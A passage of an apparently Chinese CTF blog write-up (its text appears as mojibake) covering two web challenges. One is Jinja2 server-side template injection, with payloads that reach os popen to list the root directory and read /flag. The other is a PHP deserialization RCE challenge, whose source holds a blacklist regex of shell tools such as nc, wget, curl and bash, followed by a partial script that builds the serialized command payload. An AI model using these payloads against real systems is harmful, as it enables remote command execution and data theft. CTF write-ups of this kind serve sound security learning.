&#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;urllib3.util.timeout.Timeout&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;urllib3.util.retry.Retry&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;_sha3.sha3_224&#x27;&gt;, &lt;class &#x27;_sha3.sha3_256&#x27;&gt;, &lt;class &#x27;_sha3.sha3_384&#x27;&gt;, &lt;class &#x27;_sha3.sha3_512&#x27;&gt;, &lt;class &#x27;_sha3.shake_128&#x27;&gt;, &lt;class &#x27;_sha3.shake_256&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;urllib3.util.ssltransport.SSLTransport&#x27;&gt;, &lt;class &#x27;_queue.SimpleQueue&#x27;&gt;, &lt;class &#x27;queue.Queue&#x27;&gt;, &lt;class &#x27;queue._PySimpleQueue&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;urllib3.fields.RequestField&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;urllib3.connection.DummyConnection&#x27;&gt;, &lt;class &#x27;urllib3.response.ContentDecoder&#x27;&gt;, &lt;class &#x27;urllib3.response.GzipDecoderState&#x27;&gt;, &lt;class &#x27;urllib3.response.BytesQueueBuffer&#x27;&gt;, &lt;class &#x27;urllib3._request_methods.RequestMethods&#x27;&gt;, &lt;class &#x27;urllib3.connectionpool.ConnectionPool&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;charset_normalizer.md.MessDetectorPlugin&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatch&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatches&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CliDetectionResult&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;zipfile.ZipInfo&#x27;&gt;, &lt;class &#x27;zipfile.LZMACompressor&#x27;&gt;, &lt;class &#x27;zipfile.LZMADecompressor&#x27;&gt;, &lt;class &#x27;zipfile._SharedFile&#x27;&gt;, &lt;class &#x27;zipfile._Tellable&#x27;&gt;, &lt;class &#x27;zipfile.ZipFile&#x27;&gt;, &lt;class &#x27;zipfile.Path&#x27;&gt;, &lt;class &#x27;pathlib._Flavour&#x27;&gt;, &lt;class &#x27;pathlib._Accessor&#x27;&gt;, &lt;class &#x27;pathlib._Selector&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;pathlib.PurePath&#x27;&gt;, &lt;class &#x27;requests.cookies.MockRequest&#x27;&gt;, &lt;class &#x27;requests.cookies.MockResponse&#x27;&gt;, &lt;class &#x27;requests.auth.AuthBase&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;, &lt;class &#x27;requests.models.RequestEncodingMixin&#x27;&gt;, &lt;class &#x27;requests.models.RequestHooksMixin&#x27;&gt;, &lt;class &#x27;requests.models.Response&#x27;&gt;, &lt;class &#x27;requests.adapters.BaseAdapter&#x27;&gt;, &lt;class &#x27;requests.sessions.SessionRedirectMixin&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.structures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.Authorization&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.WWWAuthenticate&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.file_storage.FileStorage&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.headers.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.ContentRange&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;werkzeug.test.Cookie&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;flask.globals._FakeStack&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;flask.json.provider.JSONProvider&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.converters.BaseConverter&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RulePart&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.State&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.StateMachineMatcher&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.MapAdapter&#x27;&gt;, &lt;class &#x27;_csv.Dialect&#x27;&gt;, &lt;class &#x27;_csv.reader&#x27;&gt;, &lt;class &#x27;_csv.writer&#x27;&gt;, &lt;class &#x27;csv.Dialect&#x27;&gt;, &lt;class &#x27;csv.DictReader&#x27;&gt;, &lt;class &#x27;csv.DictWriter&#x27;&gt;, &lt;class &#x27;csv.Sniffer&#x27;&gt;, &lt;class &#x27;configparser.Interpolation&#x27;&gt;, &lt;class &#x27;importlib.metadata.FileHash&#x27;&gt;, &lt;class &#x27;importlib.metadata.Distribution&#x27;&gt;, &lt;class &#x27;importlib.metadata.DistributionFinder.Context&#x27;&gt;, &lt;class &#x27;importlib.metadata.FastPath&#x27;&gt;, &lt;class &#x27;importlib.metadata.Prepared&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._Waiter&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._AcquireFutures&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Future&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Executor&#x27;&gt;, &lt;class &#x27;asyncio.coroutines.CoroWrapper&#x27;&gt;, &lt;class &#x27;asyncio.events.Handle&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractServer&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoop&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoopPolicy&#x27;&gt;, &lt;class &#x27;_asyncio.Future&#x27;&gt;, &lt;class &#x27;_asyncio.FutureIter&#x27;&gt;, &lt;class &#x27;TaskStepMethWrapper&#x27;&gt;, &lt;class &#x27;TaskWakeupMethWrapper&#x27;&gt;, &lt;class &#x27;_RunningLoopHolder&#x27;&gt;, &lt;class &#x27;asyncio.futures.Future&#x27;&gt;, &lt;class &#x27;asyncio.protocols.BaseProtocol&#x27;&gt;, &lt;class &#x27;asyncio.transports.BaseTransport&#x27;&gt;, &lt;class &#x27;asyncio.sslproto._SSLPipe&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManager&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManagerMixin&#x27;&gt;, &lt;class &#x27;asyncio.locks.Event&#x27;&gt;, &lt;class &#x27;asyncio.trsock.TransportSocket&#x27;&gt;, &lt;class &#x27;asyncio.queues.Queue&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamWriter&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamReader&#x27;&gt;, &lt;class &#x27;asyncio.subprocess.Process&#x27;&gt;, &lt;class &#x27;asyncio.unix_events.AbstractChildWatcher&#x27;&gt;, &lt;class &#x27;blinker._saferef.BoundMethodWeakref&#x27;&gt;, &lt;class &#x27;blinker._utilities._symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.lazy_property&#x27;&gt;, &lt;class &#x27;blinker.base.Signal&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;codeop.Compile&#x27;&gt;, &lt;class &#x27;codeop.CommandCompiler&#x27;&gt;, &lt;class &#x27;code.InteractiveInterpreter&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr._Helper&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr.DebugReprGenerator&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.HTMLStringO&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.ThreadedStream&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console._ConsoleLoader&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.Console&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.DebugTraceback&#x27;&gt;, &lt;class &#x27;werkzeug.debug._ConsoleFrame&#x27;&gt;, &lt;class &#x27;werkzeug.debug.DebuggedApplication&#x27;&gt;, &lt;class &#x27;werkzeug._reloader.ReloaderLoop&#x27;&gt;] &quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br>count = <span class="hljs-number">0</span><br>tem = <span class="hljs-string">&#x27;os._wrap_close&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[i])<br>    <span class="hljs-keyword">if</span> tem <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>[i]:<br>        <span class="hljs-built_in">print</span>(count)<br>        <span class="hljs-keyword">break</span><br>    count = count+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010163213824.png" alt="image-20231010163213824"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä½¿ç”¨&quot;~&quot;è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼š<br>secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010161929907.png" alt="image-20231010161929907"></p><p>paylaod:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162204147.png" alt="image-20231010162204147"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;ls /&quot;).read())%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162348128.png" alt="image-20231010162348128"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;tac /flag&quot;).read())%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162449022.png" alt="image-20231010162449022"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-comment">//æœ‰ç±»çš„è¾“å‡ºä¼šè¿›è¡Œæ‰§è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//è¿‡æ»¤äº†:$ . ! @ # % ^ &amp; * ? &#123; &#125; &gt; &lt;</span><br>        <span class="hljs-comment">//nc tee wget exec bash sh netcat grep base64 rev curl </span><br>        <span class="hljs-comment">//wget gcc php python pingtouch mv mkdir cp</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-comment">//æ— å›æ˜¾rce</span><br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å¯ç”¨äºæ‰§è¡Œ__toString()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;qwejaskdjnlka = new minipop();</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_62046696/article/details/125859628?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-2-125859628-blog-123039067.235%5Ev38%5Epc_relevant_anti_vip_base&spm=1001.2101.3001.4242.2&utm_relevant_index=5">rceï¼ˆæ— å›æ˜¾ï¼‰_æ— å›æ˜¾rce_å¶å°”èº²èº²ä¹Œäº‘334çš„åšå®¢-CSDNåšå®¢</a></p><p>æµ‹è¯•å‘½ä»¤æ˜¯å¦è¢«æ‰§è¡Œ:</p><p>æ„é€ rceè„šæœ¬:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-comment">// $payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;</span><br><span class="hljs-comment">// $obj-&gt;code = $payload;</span><br><span class="hljs-variable">$obj</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span 